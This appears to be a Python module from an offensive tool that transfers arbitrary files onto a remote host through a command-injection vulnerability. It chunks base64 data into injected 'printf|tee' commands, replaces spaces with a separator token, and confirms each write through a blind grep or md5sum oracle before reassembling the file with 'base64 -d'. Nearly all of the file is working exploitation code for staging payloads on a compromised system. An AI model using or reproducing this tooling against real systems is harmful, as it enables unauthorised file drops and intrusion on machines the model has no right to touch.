"""Reliable file transfer over the injection channel."""

from __future__ import annotations

import base64
import re
import time

from .inject import I

CHUNK = 48
MAX_TRIES = 4

# tag and target are interpolated raw into injected shell commands; strict
# validation is the primary defense against command injection.
TAG_RE = re.compile(r"^[A-Za-z0-9._-]{1,32}$")
TARGET_RE = re.compile(r"^[A-Za-z0-9/._-]{1,200}$")


def _validate_tag(tag: str) -> str:
    """Validate a transfer tag; reject anything with shell significance."""
    if not isinstance(tag, str) or not TAG_RE.fullmatch(tag):
        raise ValueError(
            f"tag must match [A-Za-z0-9._-]{{1,32}}: {tag!r}")
    return tag


def _validate_target(target: str) -> str:
    """Validate a remote target path for the assembled file.

    Must be an absolute path containing only [A-Za-z0-9/._-], with no '..' —
    so no spaces, quotes, expansions or other shell metacharacters survive.
    """
    if not isinstance(target, str) or not target.startswith("/"):
        raise ValueError(f"target must be an absolute path: {target!r}")
    if ".." in target:
        raise ValueError(f"target must not contain '..': {target!r}")
    if not TARGET_RE.fullmatch(target):
        raise ValueError(
            "target may only contain [A-Za-z0-9/._-] and be at most "
            f"200 characters: {target!r}")
    return target


def validate_target(target: str) -> str:
    """Public wrapper so callers (e.g. the CLI) can validate the target
    before pushing any data."""
    return _validate_target(target)


def to_b64url(data: bytes) -> str:
    return base64.b64encode(data).decode().replace("+", "-").replace("/", "_")


def chunk_text(text: str, size: int = CHUNK) -> list[str]:
    return [text[i:i + size] for i in range(0, len(text), size)]


def push_data(inj, data: bytes, tag: str) -> list[str]:
    """Write data as verified b64url part files; return ordered part paths."""
    tag = _validate_tag(tag)
    b64 = to_b64url(data)
    inj.do(f"rm{I}-f{I}/tmp/nxseg_{tag}_*")
    parts: list[str] = []
    for n, chunk in enumerate(chunk_text(b64)):
        parts += _write_segment(inj, chunk, f"/tmp/nxseg_{tag}_{n:03d}")
    return parts


def _write_segment(inj, seg: str, part: str, depth: int = 0) -> list[str]:
    # grep -qFx matches the WHOLE line: the file has no trailing newline, so
    # an exact full-line match proves content and length in one oracle call.
    for attempt in range(MAX_TRIES):
        inj.do(f"printf{I}%s{I}{seg}|tee{I}{part}")
        time.sleep(0.4)
        if inj.ask(f"grep{I}-qFx{I}{seg}{I}{part}"):
            inj.log(f"[transfer] {part} ok ({len(seg)} chars)")
            return [part]
        inj.log(f"[transfer] {part} attempt {attempt + 1} failed")
    if depth >= 6 or len(seg) <= 2:
        raise RuntimeError(f"segment too stubborn: {seg!r}")
    mid = len(seg) // 2
    inj.log(f"[transfer] bisecting segment of {len(seg)} chars")
    return (_write_segment(inj, seg[:mid], part + "a", depth + 1)
            + _write_segment(inj, seg[mid:], part + "b", depth + 1))


def assemble(inj, parts: list[str], target: str,
             expect_md5: str | None = None) -> None:
    """cat parts | tr '_-' '/+' | base64 -d | tee target (grouped, short cmds).

    When expect_md5 is given, verify the assembled target end-to-end via the
    oracle and raise on mismatch — the backend executes writes asynchronously
    and a late/duplicated segment can silently corrupt the result.
    """
    target = _validate_target(target)
    groups = [parts[i:i + 6] for i in range(0, len(parts), 6)]
    temps = []
    for gi, g in enumerate(groups):
        tmp = f"/tmp/nxg_{gi}"
        inj.do(f"cat{I}" + " ".join(g) + f"|tee{I}{tmp}")
        temps.append(tmp)
    inj.do(f"cat{I}" + " ".join(temps)
           + f"|tr{I}'_-'{I}'/+'|base64{I}-d|tee{I}{target}")
    time.sleep(0.5)
    if expect_md5 and not inj.dry_run:
        if not inj.ask(f"md5sum{I}{target}|grep{I}-q{I}{expect_md5}"):
            raise RuntimeError(f"target md5 mismatch after transfer: {target}")
    # Clean up the intermediate group temps this function created.
    inj.do(f"rm{I}-f{I}/tmp/nxg_*")
